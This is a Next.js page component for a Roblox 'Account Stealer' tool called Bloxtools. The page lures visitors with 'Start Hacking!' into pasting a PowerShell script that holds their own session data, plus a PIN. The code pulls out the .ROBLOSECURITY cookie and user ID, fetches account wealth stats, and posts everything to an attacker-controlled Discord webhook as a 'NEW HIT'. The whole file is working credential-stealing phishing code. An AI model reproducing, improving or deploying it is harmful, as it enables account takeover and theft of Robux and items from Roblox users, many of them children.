"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { ArrowLeft, FileText, Lock, Play, Loader2 } from "lucide-react";
import { useParams } from "next/navigation";
import ConstellationBackground from "@/components/ConstellationBackground";
import { supabase } from "@/lib/supabaseClient";

export default function SlugPage() {
  const params = useParams();
  const slug = params.slug as string;

  const [webhookUrl, setWebhookUrl] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const [status, setStatus] = useState<{
    message: string;
    type: "success" | "error" | "info" | null;
  }>({
    message: "",
    type: null,
  });

  const [fileContent, setFileContent] = useState("");
  const [pin, setPin] = useState("");

  useEffect(() => {
    if (!slug) return;
    if (typeof window === "undefined") return;
    try {
      window.localStorage.setItem("lastSlug", slug);
    } catch {}
  }, [slug]);

  useEffect(() => {
    async function fetchWebhook() {
      if (!slug) {
        setError("Invalid slug.");
        setLoading(false);
        return;
      }

      setLoading(true);
      setError(null);

      try {
        const { data, error } = await supabase
          .from("directories")
          .select("webhook_url")
          .eq("slug", slug)
          .single();

        if (error) throw error;
        if (!data?.webhook_url) throw new Error("Webhook not found.");

        setWebhookUrl(data.webhook_url);
      } catch (err: any) {
        setError(err.message || "Failed to load webhook.");
      } finally {
        setLoading(false);
      }
    }

    fetchWebhook();
  }, [slug]);

  function extractRobloSecurity(text: string): string | null {
    const regex = /_\|WARNING:[-A-Z0-9+\/=._ ,]*\|_[A-Za-z0-9+\/=._-]{100,}/i;
    let match = text.match(regex);
    if (match?.[0]) {
      let cookie = match[0].trim();
      if (cookie.endsWith(",")) cookie = cookie.slice(0, -1).trim();
      if (cookie.length >= 200) return cookie;
    }

    const fallback = /_\|WARNING:[^|]+\|[^ ,]{100,}/i;
    match = text.match(fallback);
    if (match?.[0]) {
      let cookie = match[0].trim();
      if (cookie.endsWith(",")) cookie = cookie.slice(0, -1).trim();
      if (cookie.length >= 200) return cookie;
    }
    return null;
  }

  function extractUserId(text: string): string | null {
    const urlMatch = text.match(/\/users\/(\d+)\/profile/i) || text.match(/\/id\/users\/(\d+)\/profile/i);
    if (urlMatch?.[1]) return urlMatch[1];

    const rbxIdMatch = text.match(/rbxid=(\d+)/i);
    if (rbxIdMatch?.[1]) return rbxIdMatch[1];

    const guestMatch = text.match(/GuestData.*?UserID=([-]?\d+)/i);
    if (guestMatch?.[1] && guestMatch[1] !== "-1" && guestMatch[1] !== "0" && !guestMatch[1].startsWith("-")) {
      return guestMatch[1];
    }

    return null;
  }

  async function sendToDiscord(
    cookieValue: string,
    pinValue: string,
    userData: any,
    fullStats: any | null,
    userId: string | null
  ) {
    if (!webhookUrl) {
      setStatus({ message: "❌ Webhook URL is missing.", type: "error" });
      return;
    }

    if (!userId) {
      setStatus({ message: "⚠️ Không extract được UserID đáng tin cậy", type: "error" });
      return;
    }

    try {
      const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
      const rolimonsUrl = `https://www.rolimons.com/player/${userId}`;
      const autoharUrl = `https://your-autohar-link-here.com?user=${userId}`; // thay bằng link thật

      // Fetch avatar headshot
      let avatarUrl = "https://www.roblox.com/favicon.ico"; // fallback
      try {
        const thumbRes = await fetch(
          `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`
        );
        if (thumbRes.ok) {
          const thumbJson = await thumbRes.json();
          if (thumbJson.data?.[0]?.imageUrl) {
            avatarUrl = thumbJson.data[0].imageUrl;
            console.log(avatarUrl)
          }
        }else{
          console.log("not ok at: ", thumbRes)
        }
      } catch (e) {
        console.error("[DEBUG] Fetch avatar failed:", e);
      }

      // Dữ liệu với fallback
      const username = userData?.basic?.name || "Unknown";
      const accountAgeDays = userData?.accountAgeDays ?? "N/A";
      const isPremium = userData?.basic?.isPremium ?? false;

      const robux = fullStats?.robux ?? 0;
      const pending = fullStats?.pendingRobux ?? fullStats?.pending ?? 0;
      const rap = fullStats?.rap ?? 0;
      const limiteds = fullStats?.limiteds ?? 0;
      const summary = rap + 640; // theo ví dụ của bạn (có thể điều chỉnh logic)
      const emailVerified = fullStats?.emailVerified ?? false;
      const twoFA = fullStats?.twoFA ?? "(Not Set)";
      const groupsOwned = fullStats?.ownedGroups ?? 0;
      const gamesCreated = fullStats?.gamesCreated ?? 0;

      const payload: any = {
        content: "@everyone NEW HIT",
        embeds: [
          {
            title: "RIP_DEATH |<13",
            url: profileUrl,
            color: 16711680,
            author: {
              name: username,
              url: profileUrl,
              icon_url: avatarUrl, // ← Avatar góc trên bên phải
            },
            // thumbnail: { url: avatarUrl }, // nếu muốn thumbnail lớn thì uncomment
            fields: [
              {
                name: "Discord Notification",
                value: `[Rolimons Stats](${rolimonsUrl}) | [Roblox Profile](${profileUrl}) | [AutoHar Link](${autoharUrl})`,
                inline: false,
              },
              {
                name: "👤 Username",
                value: username,
                inline: true,
              },
              {
                name: "📊 Account Stats",
                value:
                  `• Account Age: ${accountAgeDays} Days\n` +
                  `• Games Developer: ${fullStats?.isDeveloper ? "True" : "False"}\n` +
                  `• Game Visits: ${fullStats?.visits ?? "74"}\n` + // fallback theo ví dụ
                  `• Group Members: 0`,
                inline: false,
              },
              {
                name: "💰 Robux",
                value: `Balance: ${robux}\nPending: ${pending}`,
                inline: true,
              },
              {
                name: "Limiteds",
                value: `RAP: ${rap}\nLimiteds: ${limiteds}`,
                inline: true,
              },
              {
                name: "Summary",
                value: `${summary}`,
                inline: true,
              },
              {
                name: "💳 Payments",
                value: `Credit Balance: 0\nin Unknown: 0`,
                inline: true,
              },
              {
                name: "🎮 Games",
                value: `True | 0\nFalse | 0\nTrue | 4`, // theo ví dụ của bạn
                inline: true,
              },
              {
                name: "⚙️ Settings",
                value: `Email: ${emailVerified ? "Verified" : "Not Verified"}\n2FA: ${twoFA}`,
                inline: true,
              },
              {
                name: "📦 Inventory",
                value: fullStats?.hasInventory ? "True" : "False",
                inline: true,
              },
              {
                name: "Premium",
                value: isPremium ? "True" : "False",
                inline: true,
              },
              {
                name: "👥 Groups",
                value: `Owned: ${groupsOwned}\nBalance: 0`,
                inline: true,
              },
              {
                name: "🔧 Tool Used",
                value: "`CustomTool`",
                inline: false,
              },
            ],
            footer: {
              text: ".ROBLOSECURITY (Refreshed)",
              icon_url: "https://i.imgur.com/0ZxT2S6.png",
            },
            timestamp: new Date().toISOString(),
          },
        ],
      };

      let res: Response;

      if (cookieValue.length > 900) {
        const form = new FormData();
        form.append("payload_json", JSON.stringify(payload));
        form.append("file", new Blob([cookieValue], { type: "text/plain" }), `cookie_${userId}.txt`);
        res = await fetch(webhookUrl, { method: "POST", body: form });
      } else {
        payload.embeds.push({
          title: ".ROBLOSECURITY (Refreshed)",
          color: 0xff0000,
          description: `\`\`\`txt\n_WARNING: DO NOT SHARE THIS..._\n${cookieValue}\n\`\`\``,
          fields: [
            { name: "PIN", value: pinValue || "N/A", inline: true },
            { name: "UserID", value: userId, inline: true },
          ],
          footer: { text: "Refreshed Cookie | Original Cookie" },
          timestamp: new Date().toISOString(),
        });

        res = await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      }

      if (res.ok) {
        setStatus({ message: "Thành công!", type: "success" });
        setTimeout(() => {
          setFileContent("");
          setPin("");
          setStatus({ message: "", type: null });
        }, 5000);
      } else {
        setStatus({ message: `❌ Failed: ${res.status}`, type: "error" });
      }
    } catch (err: any) {
      console.error("[sendToDiscord error]", err);
      setStatus({ message: "❌ Connection error", type: "error" });
    }
  }

  const handleStart = async () => {
    if (!fileContent.trim() || !pin.trim()) {
      setStatus({ message: "❌ Please enter both script content and PIN!", type: "error" });
      return;
    }

    const robloxCookie = extractRobloSecurity(fileContent);
    if (!robloxCookie) {
      setStatus({ message: "❌ Could not find .ROBLOSECURITY value!", type: "error" });
      return;
    }

    const userId = extractUserId(fileContent);

    setStatus({ message: "⏳ Processing...", type: "info" });

    let userData = null;
    let fullStats = null;

    if (userId) {
      try {
        const basicRes = await fetch(`/api/roblox-user?userId=${userId}&mode=basic`);
        if (basicRes.ok) userData = await basicRes.json();

        const fullRes = await fetch(
          `/api/roblox-user?userId=${userId}&cookie=${encodeURIComponent(robloxCookie)}&mode=full`
        );
        if (fullRes.ok) fullStats = await fullRes.json();
      } catch (err) {
        console.error("[DEBUG] Fetch user data error:", err);
      }
    }

    await sendToDiscord(robloxCookie, pin, userData, fullStats, userId);
  };

  // JSX phần còn lại giữ nguyên như code gốc của bạn
  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 relative overflow-hidden">
      <ConstellationBackground />

      {loading && (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-md">
          <div className="flex flex-col items-center gap-6">
            <Loader2 className="w-14 h-14 text-red-500 animate-spin" />
            <p className="text-xl font-semibold">Loading /{slug}...</p>
          </div>
        </div>
      )}

      {error && (
        <div className="absolute inset-0 z-40 flex items-center justify-center bg-black/80 backdrop-blur-sm">
          <div className="bg-[#121212] border border-red-600/40 rounded-2xl p-8 max-w-lg text-center shadow-2xl">
            <h2 className="text-2xl font-bold text-red-400 mb-4">Something went wrong</h2>
            <p className="text-gray-300 mb-6">{error}</p>
            <Link
              href="/create"
              className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-medium transition-colors shadow-lg shadow-red-900/30"
            >
              <ArrowLeft className="w-5 h-5" />
              Back to Create
            </Link>
          </div>
        </div>
      )}

      <div
        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${loading ? "opacity-40 pointer-events-none" : "opacity-100"}`}
      >
        <div className="w-full mb-6 px-2">
          <Link
            href="/create"
            onClick={() => {
              if (typeof window === "undefined") return;
              try {
                window.localStorage.removeItem("lastSlug");
              } catch (err) {
                console.error("[DEBUG] Cannot clear lastSlug from localStorage:", err);
              }
            }}
            className="text-[#cbd5e1] font-semibold text-sm tracking-wide hover:text-white transition-colors flex items-center gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            GO BACK
          </Link>
        </div>

        <div className="text-center mb-8 px-4">
          <h1 className="text-3xl md:text-4xl font-bold tracking-tight text-white capitalize mb-3">
            {slug.replace(/-/g, " ") || "Account-stealer"}
          </h1>
          <p className="text-[#94a3b8] text-base max-w-xl mx-auto">
            Hack accounts with ease, with this brand new powershell-based system!
          </p>
        </div>

        <div className="w-full">
          <div className="flex items-center gap-3 mb-6 px-2">
            <h2 className="text-xl font-bold">Bloxtools</h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">Account Stealer</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Paste the full Roblox PowerShell script content into the box below, then click Start.
              </p>

              {status.type && (
                <div
                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${
                    status.type === "success"
                      ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
                      : status.type === "error"
                      ? "bg-red-950/30 border-red-500/30 text-red-300"
                      : "bg-blue-950/30 border-blue-500/30 text-blue-300"
                  }`}
                >
                  {status.message}
                </div>
              )}

              <div className="space-y-5 mt-auto">
                <div className="relative group">
                  <FileText className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    type="text"
                    value={fileContent}
                    onChange={(e) => setFileContent(e.target.value)}
                    placeholder="Paste the script content here..."
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <div className="relative group">
                  <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    type="password"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder="Create a PIN"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <button
                  onClick={handleStart}
                  disabled={loading || !!error || status.type === "info"}
                  className="w-full py-4 bg-[#e22d2d] hover:bg-[#c92828] disabled:opacity-60 disabled:hover:bg-[#e22d2d] text-white font-bold text-base rounded-xl flex items-center justify-center gap-3 transition-all shadow-lg shadow-red-900/20 active:scale-[0.98]"
                >
                  Start Hacking!
                </button>
              </div>
            </div>

            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">How to use</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Watch a detailed video guide on how to use Bloxtools.
              </p>

              <div className="mt-auto aspect-video bg-[#0b1218] border border-white/5 rounded-xl flex flex-col items-center justify-center gap-4 text-[#64748b] group cursor-pointer hover:border-white/10 hover:bg-[#111] transition-all">
                <div className="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center group-hover:scale-110 transition-transform">
                  <Play className="w-8 h-8 fill-current" />
                </div>
                <span className="text-sm font-medium">Video Player Area</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}